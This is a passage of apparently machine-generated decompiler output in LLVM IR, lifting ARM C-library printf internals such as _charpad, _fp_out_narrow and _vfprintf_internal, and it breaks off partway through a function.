  %v2_102bc4 = icmp eq i32 %storemerge2, 0
  br i1 %v2_102bc4, label %dec_label_pc_102c4, label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %dec_label_pc_10298, %dec_label_pc_102bc
  %v1_102b0 = phi i32 [ %storemerge, %dec_label_pc_102bc ], [ %storemerge2, %dec_label_pc_10298 ]
  %v1_102a8 = inttoptr i32 %v1_102b0 to i16*
  %v2_102a8 = load i16, i16* %v1_102a8, align 2
  %v3_102a8 = zext i16 %v2_102a8 to i32
  store i32 %v3_102a8, i32* %r3.global-to-local, align 4
  %v1_102ac = and i32 %v3_102a8, 64
  %v2_102ac = icmp eq i32 %v1_102ac, 0
  br i1 %v2_102ac, label %dec_label_pc_102bc, label %bb

bb:                                               ; preds = %dec_label_pc_102a8
  store i32 %v1_102b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_102bc

dec_label_pc_102bc:                               ; preds = %dec_label_pc_102a8, %bb
  %v1_102b4 = xor i1 %v2_102ac, true
  call void @__pseudo_cond_branch(i1 %v1_102b4, i32 ptrtoint (i32* @global_var_102e0.623 to i32))
  %v0_102b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_102b8 = add i32 %v0_102b8, 32
  %storemerge.in = inttoptr i32 %v1_102b8 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_102bc = icmp eq i32 %storemerge, 0
  br i1 %v2_102bc, label %dec_label_pc_102bc.dec_label_pc_102c4_crit_edge, label %dec_label_pc_102a8

dec_label_pc_102bc.dec_label_pc_102c4_crit_edge:  ; preds = %dec_label_pc_102bc
  %v1_102c8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_102c4

dec_label_pc_102c4:                               ; preds = %dec_label_pc_102bc.dec_label_pc_102c4_crit_edge, %dec_label_pc_10298
  %v1_102c8 = phi i32 [ %v1_102c8.pre, %dec_label_pc_102bc.dec_label_pc_102c4_crit_edge ], [ %v1_102c814, %dec_label_pc_10298 ]
  %v2_102c4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_102c4, i32* %r4.global-to-local, align 4
  ret i32 %v1_102c8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10234, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 1, 2, 5, 7, 3, 4 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_102bc, { 1, 0 }
  uselistorder label %dec_label_pc_102a8, { 1, 0 }
  uselistorder label %dec_label_pc_1027c, { 1, 0 }
  uselistorder label %dec_label_pc_10248, { 1, 0 }
}

define i32 @function_102d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_102d0:
  %v0_102d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_102d0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_102d0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_102d0, %bb
  %v4_102dc = phi i32 [ %arg1, %dec_label_pc_102d0 ], [ 0, %bb ]
  ret i32 %v4_102dc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_102e0 = load i32, i32* @r4, align 4
  store i32 %v3_102e0, i32* %stack_var_-8, align 4
  %v0_102e4 = load i32, i32* @r0, align 4
  %v1_102e4 = add i32 %v0_102e4, 8
  %v2_102e4 = inttoptr i32 %v1_102e4 to i32*
  %v3_102e4 = load i32, i32* %v2_102e4, align 4
  %v1_102e8 = add i32 %v0_102e4, 16
  %v2_102e8 = inttoptr i32 %v1_102e8 to i32*
  %v3_102e8 = load i32, i32* %v2_102e8, align 4
  %v9_102ec = icmp eq i32 %v3_102e8, %v3_102e4
  store i32 %v0_102e4, i32* %r4.global-to-local, align 4
  br i1 %v9_102ec, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_102e4, i32* %v2_102e8, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_102f8 = xor i1 %v9_102ec, true
  call void @__pseudo_cond_branch(i1 %v1_102f8, i32 ptrtoint (i32* @global_var_15cec.624 to i32))
  %v0_102fc = load i32, i32* %r4.global-to-local, align 4
  %v1_102fc = add i32 %v0_102fc, 8
  %v2_102fc = inttoptr i32 %v1_102fc to i32*
  %v3_102fc = load i32, i32* %v2_102fc, align 4
  %v1_10300 = add i32 %v0_102fc, 16
  %v2_10300 = inttoptr i32 %v1_10300 to i32*
  %v3_10300 = load i32, i32* %v2_10300, align 4
  %v2_10304 = sub i32 %v3_10300, %v3_102fc
  %v2_10308 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10308, i32* @r4, align 4
  ret i32 %v2_10304

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_10310 = load i32, i32* @r4, align 4
  %v6_10310 = load i32, i32* @r5, align 4
  %v9_10310 = load i32, i32* @r6, align 4
  %v12_10310 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_1031c = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_1031c, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_103342 = icmp eq i32 %arg3, 0
  br i1 %v2_103342, label %dec_label_pc_10354, label %dec_label_pc_10348

dec_label_pc_10330:                               ; preds = %dec_label_pc_10348
  %v1_10330 = add i32 %v0_10330, -1
  store i32 %v1_10330, i32* @r4, align 4
  %v2_10334 = icmp eq i32 %v1_10330, 0
  %v0_10340 = load i32, i32* @r7, align 4
  br i1 %v2_10334, label %dec_label_pc_10354.loopexit, label %dec_label_pc_10348

dec_label_pc_10348:                               ; preds = %entry, %dec_label_pc_10330
  %v0_103404 = phi i32 [ %v0_10340, %dec_label_pc_10330 ], [ %arg1, %entry ]
  %v3_10348 = inttoptr i32 %v0_103404 to i16*
  %v4_10348 = call i32 @__stdio_fwrite(i32 %v10_1031c, i32 1, i16* %v3_10348)
  %v7_1034c = icmp eq i32 %v4_10348, 1
  %v0_10330 = load i32, i32* @r4, align 4
  br i1 %v7_1034c, label %dec_label_pc_10330, label %dec_label_pc_10354.loopexit

dec_label_pc_10354.loopexit:                      ; preds = %dec_label_pc_10330, %dec_label_pc_10348
  %v0_10354.ph = phi i32 [ %v0_10330, %dec_label_pc_10348 ], [ 0, %dec_label_pc_10330 ]
  %v1_10354.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10354

dec_label_pc_10354:                               ; preds = %dec_label_pc_10354.loopexit, %entry
  %v1_10354 = phi i32 [ 0, %entry ], [ %v1_10354.pre, %dec_label_pc_10354.loopexit ]
  %v0_10354 = phi i32 [ 0, %entry ], [ %v0_10354.ph, %dec_label_pc_10354.loopexit ]
  %v2_10354 = sub i32 %v1_10354, %v0_10354
  store i32 %v3_10310, i32* @r4, align 4
  store i32 %v6_10310, i32* @r5, align 4
  store i32 %v9_10310, i32* @r6, align 4
  store i32 %v12_10310, i32* @r7, align 4
  ret i32 %v2_10354

; uselistorder directives
  uselistorder i32 %v1_10330, { 1, 0 }
  uselistorder label %dec_label_pc_10354.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10348, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10364 = load i32, i32* @r4, align 4
  store i32 %v3_10364, i32* %stack_var_-24, align 4
  %v6_10364 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_1036c = and i32 %arg2, 128
  %v2_1036c = icmp eq i32 %v1_1036c, 0
  %v0_10370 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10370, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_1036c, label %dec_label_pc_103c0thread-pre-split, label %dec_label_pc_10384

dec_label_pc_10384:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_10388 = call i32 @strlen(i8* %arg4)
  store i32 %v3_10388, i32* %r0.global-to-local, align 4
  %v1_1038c = load i32, i32* %r4.global-to-local, align 4
  %v2_1038c = sub i32 %v1_1038c, %v3_10388
  store i32 %v2_1038c, i32* @r4, align 4
  store i32 %v3_10388, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_1038c, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_103a0

.thread:                                          ; preds = %dec_label_pc_10384
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_103bc

dec_label_pc_103a0:                               ; preds = %dec_label_pc_10384
  %v0_103a0 = load i32, i32* @r5, align 4
  %v1_103a0 = urem i32 %v0_103a0, 128
  %v0_103a4 = load i32, i32* @r8, align 4
  store i32 %v0_103a4, i32* %r0.global-to-local, align 4
  %v3_103ac = trunc i32 %v1_103a0 to i8
  %v4_103ac = call i32 @_charpad(i32 %v0_103a4, i8 %v3_103ac, i32 %v2_1038c)
  store i32 %v4_103ac, i32* %r0.global-to-local, align 4
  %v1_103b0 = load i32, i32* @r4, align 4
  %v9_103b0 = icmp eq i32 %v4_103ac, %v1_103b0
  store i32 %v4_103ac, i32* %r5.global-to-local, align 4
  br i1 %v9_103b0, label %dec_label_pc_103a0.dec_label_pc_103bc_crit_edge, label %dec_label_pc_103dc

dec_label_pc_103a0.dec_label_pc_103bc_crit_edge:  ; preds = %dec_label_pc_103a0
  %v0_103bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_103bc

dec_label_pc_103bc:                               ; preds = %.thread, %dec_label_pc_103a0.dec_label_pc_103bc_crit_edge
  %v0_103bc = phi i32 [ %v0_103bc.pre, %dec_label_pc_103a0.dec_label_pc_103bc_crit_edge ], [ %v3_10388, %.thread ]
  store i32 %v0_103bc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_103c0

dec_label_pc_103c0thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_103c0

dec_label_pc_103c0:                               ; preds = %dec_label_pc_103c0thread-pre-split, %dec_label_pc_103bc
  %v5_103cc = phi i32 [ %arg3, %dec_label_pc_103c0thread-pre-split ], [ %v0_103bc, %dec_label_pc_103bc ]
  %tmp14 = icmp slt i32 %v5_103cc, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_103c0
  br label %bb15

bb:                                               ; preds = %dec_label_pc_103c0
  %v5_103c8 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_103c8, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_15da0.625 to i32))
  %v0_103d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_103d8 = add i32 %storemerge, %v0_103d8
  store i32 %v2_103d8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_103dc

dec_label_pc_103dc:                               ; preds = %dec_label_pc_103a0, %bb15
  %v0_103dc = phi i32 [ %v4_103ac, %dec_label_pc_103a0 ], [ %v2_103d8, %bb15 ]
  store i32 %v0_103dc, i32* %r0.global-to-local, align 4
  %v2_103e0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_103e0, i32* %r4.global-to-local, align 4
  store i32 %v6_10364, i32* %r5.global-to-local, align 4
  ret i32 %v0_103dc

; uselistorder directives
  uselistorder i32 %v0_103dc, { 1, 0 }
  uselistorder i32 %v0_103bc, { 1, 0 }
  uselistorder i32 %v2_1038c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_103dc, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_103bc, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_103e8 = load i32, i32* @r5, align 4
  %v12_103e8 = load i32, i32* @r7, align 4
  %v18_103e8 = load i32, i32* @sb, align 4
  %v21_103e8 = load i32, i32* @sl, align 4
  %v24_103e8 = load i32, i32* @fp, align 4
  %v2_103f0 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_103f0, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_103f0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10400 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10400, i32* @r5, align 4
  %v2_10404 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_10404, i32* %r0.global-to-local, align 4
  %v1_1040c = icmp slt i32 %v2_10404, 0
  br i1 %v1_1040c, label %dec_label_pc_1041c, label %dec_label_pc_10450

dec_label_pc_1041c:                               ; preds = %entry
  %v3_1041c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_1041c, i32* @r4, align 4
  %v1_10420 = inttoptr i32 %v3_1041c to i8*
  store i32 %v3_1041c, i32* %r0.global-to-local, align 4
  %v3_10424 = call i32 @strlen(i8* %v1_10420)
  store i32 %v3_10424, i32* %r0.global-to-local, align 4
  %v2_10428 = icmp eq i32 %v3_10424, 0
  br i1 %v2_10428, label %bb, label %dec_label_pc_10438

bb:                                               ; preds = %dec_label_pc_1041c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10aa0

dec_label_pc_10438:                               ; preds = %dec_label_pc_1041c
  %v0_10438 = load i32, i32* @r4, align 4
  store i32 %v0_10438, i32* %r0.global-to-local, align 4
  %v0_1043c = load i32, i32* @fp, align 4
  store i32 %v0_1043c, i32* %r2.global-to-local, align 4
  %v3_10440 = inttoptr i32 %v0_1043c to i16*
  %v4_10440 = call i32 @__stdio_fwrite(i32 %v0_10438, i32 %v3_10424, i16* %v3_10440)
  store i32 %v4_10440, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10aa0

dec_label_pc_10450:                               ; preds = %entry
  %v0_10450 = load i32, i32* @r5, align 4
  store i32 %v2_103f0, i32* %r0.global-to-local, align 4
  %v2_10458 = call i32 @_ppfs_prepargs(i32 %v2_103f0, i32 %v0_10450)
  store i32 %v2_10458, i32* %r0.global-to-local, align 4
  store i32 3856, i32* @ip, align 4
  %v0_104a0 = load i32, i32* @r4, align 4
  store i32 %v0_104a0, i32* %r2.global-to-local, align 4
  %v1_10524 = bitcast i32* %stack_var_-352 to i8*
  %v4_10534 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_10540 = ptrtoint i32* %stack_var_-272 to i32
  %v2_10558 = ptrtoint i32* %stack_var_-40 to i32
  %v2_10574 = icmp eq i32 %tmp104, 0
  %v2_108ac = ptrtoint i32* %stack_var_-200 to i32
  %v2_108f0 = ptrtoint i32* %stack_var_-348 to i32
  %v2_108f4 = ptrtoint i32* %stack_var_-72 to i32
  %v2_107a8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_107b4 = ptrtoint i32* %stack_var_-52 to i32
  %v7_10610 = zext i8 %tmp102 to i32
  %v2_10648 = ptrtoint i32* %stack_var_-73 to i32
  %v1_10650 = bitcast i32* %stack_var_-73 to i8*
  %v2_10658 = icmp ugt i32 %tmp104, 4
  %v7_10658 = icmp eq i32 %tmp104, 5
  %v7_1053c = ptrtoint i32* %stack_var_-280 to i32
  %v5_1056c195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_1077c = icmp ugt i32 %tmp104, 16
  %v7_1077c = icmp eq i32 %tmp104, 17
  %v2_10780 = xor i1 %v7_1077c, true
  %v3_10780 = and i1 %v2_1077c, %v2_10780
  %v2_10804 = icmp ugt i32 %tmp104, 18
  %v7_10804 = icmp eq i32 %tmp104, 19
  %v2_10808 = xor i1 %v7_10804, true
  %v3_10808 = and i1 %v2_10804, %v2_10808
  %v7_108a0 = icmp eq i32 %tmp104, 20
  %v1_105b8 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -37033)
  %v2_105b8 = inttoptr i32 %v1_105b8 to i8*
  %v2_105e4 = xor i1 %v7_10658, true
  %v3_105e4 = and i1 %v2_10658, %v2_105e4
  %v7_10618 = icmp eq i32 %tmp104, 1
  %v2_10660 = xor i1 %v2_10658, true
  %v3_10660 = or i1 %v7_10658, %v2_10660
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_106c8 = icmp eq i32 %tmp104, 3
  %v11_106d4 = icmp eq i32 %tmp104, 4
  %v9_10544 = mul nuw nsw i32 %v4_10534, 8
  %v10_10544 = add i32 %v7_1053c, %v9_10544
  br label %dec_label_pc_104a4.outer

dec_label_pc_104a4.outer:                         ; preds = %dec_label_pc_10a84, %dec_label_pc_10450
  %v0_104a445 = phi i32 [ %v3_10a84, %dec_label_pc_10a84 ], [ %v0_104a0, %dec_label_pc_10450 ]
  %v0_105d8 = phi i32 [ %stack_var_-336.4, %dec_label_pc_10a84 ], [ %tmp103, %dec_label_pc_10450 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_10a84 ], [ 0, %dec_label_pc_10450 ]
  br label %dec_label_pc_104a4.outer36

dec_label_pc_104a4.outer36:                       ; preds = %dec_label_pc_104a4.outer, %dec_label_pc_10a90
  %v0_104a444 = phi i32 [ %v0_104a445, %dec_label_pc_104a4.outer ], [ %v1_10a90, %dec_label_pc_10a90 ]
  %v5_104d0 = phi i32 [ %v0_104a445, %dec_label_pc_104a4.outer ], [ %v1_10500, %dec_label_pc_10a90 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_104a4.outer ], [ %v1_10970, %dec_label_pc_10a90 ]
  %v1_104a4188 = inttoptr i32 %v0_104a444 to i8*
  %v2_104a4189 = load i8, i8* %v1_104a4188, align 1
  %v2_104a8191 = icmp eq i8 %v2_104a4189, 0
  br i1 %v2_104a8191, label %dec_label_pc_104c0, label %bb138

bb138:                                            ; preds = %dec_label_pc_104a4.outer36, %.thread6
  %v2_104a4193 = phi i8 [ %v2_104a4, %.thread6 ], [ %v2_104a4189, %dec_label_pc_104a4.outer36 ]
  %v1_104b8192 = phi i32 [ %v2_104b8, %.thread6 ], [ %v0_104a444, %dec_label_pc_104a4.outer36 ]
  %v8_104ac = icmp eq i8 %v2_104a4193, 37
  br i1 %v8_104ac, label %dec_label_pc_104c0, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_104b8 = add i32 %v1_104b8192, 1
  store i32 %v2_104b8, i32* @r4, align 4
  %v1_104a4 = inttoptr i32 %v2_104b8 to i8*
  %v2_104a4 = load i8, i8* %v1_104a4, align 1
  %v2_104a8 = icmp eq i8 %v2_104a4, 0
  br i1 %v2_104a8, label %dec_label_pc_104c0, label %bb138

dec_label_pc_104c0:                               ; preds = %bb138, %.thread6, %dec_label_pc_104a4.outer36
  %v1_104b8.lcssa = phi i32 [ %v0_104a444, %dec_label_pc_104a4.outer36 ], [ %v2_104b8, %.thread6 ], [ %v1_104b8192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_104c0 = sub i32 %v1_104b8.lcssa, %v5_104d0
  %v9_104c0 = icmp eq i32 %v1_104b8.lcssa, %v5_104d0
  br i1 %v9_104c0, label %dec_label_pc_104f4, label %dec_label_pc_104c8

dec_label_pc_104c8:                               ; preds = %dec_label_pc_104c0
  store i32 %v2_104c0, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_104c0, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_104c8
  store i32 %v5_104d0, i32* %r0.global-to-local, align 4
  %v5_104d8 = load i32, i32* @fp, align 4
  store i32 %v5_104d8, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_104c8, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_104c8 ]
  store i32 66784, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_15da0.625 to i32))
  %v0_104e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_104e0 = load i32, i32* @r5, align 4
  %v9_104e0 = icmp eq i32 %v0_104e0, %v1_104e0
  br i1 %v9_104e0, label %dec_label_pc_104e8, label %dec_label_pc_10a98

dec_label_pc_104e8:                               ; preds = %bb142
  %v2_104ec = add i32 %v0_104e0, %stack_var_-356.1.ph37
  store i32 %v2_104ec, i32* @ip, align 4
  %v0_104f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_104f4

dec_label_pc_104f4:                               ; preds = %dec_label_pc_104c0, %dec_label_pc_104e8
  %v0_10508 = phi i32 [ %v5_104d0, %dec_label_pc_104c0 ], [ %v0_104f4.pre, %dec_label_pc_104e8 ]
  %v1_10970 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_104c0 ], [ %v2_104ec, %dec_label_pc_104e8 ]
  %v1_104f4 = inttoptr i32 %v0_10508 to i8*
  %v2_104f4 = load i8, i8* %v1_104f4, align 1
  %v2_104f8 = icmp eq i8 %v2_104f4, 0
  br i1 %v2_104f8, label %dec_label_pc_10aa0, label %dec_label_pc_10500

dec_label_pc_10500:                               ; preds = %dec_label_pc_104f4
  %v1_10500 = add i32 %v0_10508, 1
  %v2_10500 = inttoptr i32 %v1_10500 to i8*
  %v3_10500 = load i8, i8* %v2_10500, align 1
  %v7_10504 = icmp eq i8 %v3_10500, 37
  store i32 %v1_10500, i32* %r2.global-to-local, align 4
  br i1 %v7_10504, label %dec_label_pc_10a90, label %dec_label_pc_10510

dec_label_pc_10510:                               ; preds = %dec_label_pc_10500
  store i32 %v2_103f0, i32* @r4, align 4
  store i32 %v2_103f0, i32* %r0.global-to-local, align 4
  store i32 %v1_10500, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_10524 = call i32 @_ppfs_parsespec(i8* %v1_10524)
  store i32 %v2_103f0, i32* @r0, align 4
  %v0_1052c = call i32 @_ppfs_setargs()
  store i32 %v0_1052c, i32* %r0.global-to-local, align 4
  store i32 %v4_10534, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_10510
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_10510, %bb145
  %storemerge = phi i32 [ %v10_10544, %bb145 ], [ %v7_10540, %dec_label_pc_10510 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_1056c195, label %dec_label_pc_10550, label %dec_label_pc_10570

dec_label_pc_10550:                               ; preds = %bb146, %dec_label_pc_10550
  %v5_1055c197 = phi i32 [ %v5_1055c, %dec_label_pc_10550 ], [ %v2_10558, %bb146 ]
  %v0_10550196 = phi i32 [ %v1_10554, %dec_label_pc_10550 ], [ %storemerge, %bb146 ]
  %v2_10550 = add i32 %v5_1055c197, -32
  %v3_10550 = inttoptr i32 %v2_10550 to i32*
  store i32 %v0_10550196, i32* %v3_10550, align 4
  %v0_10554 = load i32, i32* %r0.global-to-local, align 4
  %v1_10554 = add i32 %v0_10554, 8
  store i32 %v1_10554, i32* %r0.global-to-local, align 4
  %v1_1055c.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_1055c = mul i32 %v1_1055c.pre, 4
  %v5_1055c = add i32 %v4_1055c, %v2_10558
  %v1_10568 = add i32 %v1_1055c.pre, 1
  store i32 %v1_10568, i32* %r2.global-to-local, align 4
  %v5_1056c = icmp slt i32 %v1_1055c.pre, %tmp105
  br i1 %v5_1056c, label %dec_label_pc_10550, label %dec_label_pc_10570

dec_label_pc_10570:                               ; preds = %dec_label_pc_10550, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_10574, label %dec_label_pc_1057c, label %dec_label_pc_105a0

dec_label_pc_1057c:                               ; preds = %dec_label_pc_10570
  %v3_1057c = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_10970, i32* @ip, align 4
  %v1_10588 = inttoptr i32 %v3_1057c to i32*
  %v2_10588 = load i32, i32* %v1_10588, align 4
  store i32 %v2_10588, i32* %r0.global-to-local, align 4
  %v1_1058c = and i32 %v0_105d8, 3840
  store i32 %v1_10970, i32* %r2.global-to-local, align 4
  %v3_10594 = ashr i32 %v1_10970, 31
  %v4_10598 = inttoptr i32 %v2_10588 to i16*
  %v5_10598 = call i32 @_store_inttype(i16* %v4_10598, i32 %v1_1058c, i32 %v1_10970, i32 %v3_10594)
  store i32 %v5_10598, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10a84

dec_label_pc_105a0:                               ; preds = %dec_label_pc_10570
  br i1 %tmp207, label %dec_label_pc_1073c, label %dec_label_pc_105a8

dec_label_pc_105a8:                               ; preds = %dec_label_pc_105a0
  %v3_105b8 = load i8, i8* %v2_105b8, align 1
  %v4_105b8 = zext i8 %v3_105b8 to i32
  %v7_105bc = icmp eq i8 %v3_105b8, 10
  br i1 %v7_105bc, label %dec_label_pc_105c8, label %bb147

bb147:                                            ; preds = %dec_label_pc_105a8
  br label %bb151

dec_label_pc_105c8:                               ; preds = %dec_label_pc_105a8
  %v1_105d8 = and i32 %v0_105d8, 64
  %v2_105d8 = icmp eq i32 %v1_105d8, 0
  br i1 %v2_105d8, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_105c8
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_105c8, %bb150
  br i1 %v3_105e4, label %.thread, label %dec_label_pc_105ec

.thread:                                          ; preds = %bb151
  %v5_105e4 = sub nsw i32 0, %v4_105b8
  br label %dec_label_pc_10604

dec_label_pc_105ec:                               ; preds = %bb151
  br i1 %v7_106c8, label %bb152, label %dec_label_pc_105f8

bb152:                                            ; preds = %dec_label_pc_105ec
  br label %dec_label_pc_10604

dec_label_pc_105f8:                               ; preds = %dec_label_pc_105ec
  br i1 %v7_10618, label %dec_label_pc_10608, label %dec_label_pc_10604

dec_label_pc_10604:                               ; preds = %.thread, %bb152, %dec_label_pc_105f8
  %v0_1063081 = phi i32 [ %v5_105e4, %.thread ], [ %v4_105b8, %bb152 ], [ %v4_105b8, %dec_label_pc_105f8 ]
  br label %dec_label_pc_10608

dec_label_pc_10608:                               ; preds = %dec_label_pc_105f8, %dec_label_pc_10604
  %v0_1063080 = phi i32 [ %v0_1063081, %dec_label_pc_10604 ], [ %v4_105b8, %dec_label_pc_105f8 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_10604 ], [ 6, %dec_label_pc_105f8 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_10608 = load i32, i32* %stack_var_-348, align 4
  %v1_1060c = icmp slt i32 %v3_10608, 0
  %v7_10610. = select i1 %v1_1060c, i32 %v7_10610, i32 32
  store i32 %v7_10610., i32* @sb, align 4
  br i1 %v7_10618, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_10608
  store i32 %v2_10558, i32* %r2.global-to-local, align 4
  %v2_10620 = load i32, i32* @ip, align 4
  %v5_10620 = mul i32 %v2_10620, 4
  %v6_10620 = add i32 %v5_10620, %v2_10558
  %v2_10624 = add i32 %v6_10620, -276
  %v3_10624 = inttoptr i32 %v2_10624 to i32*
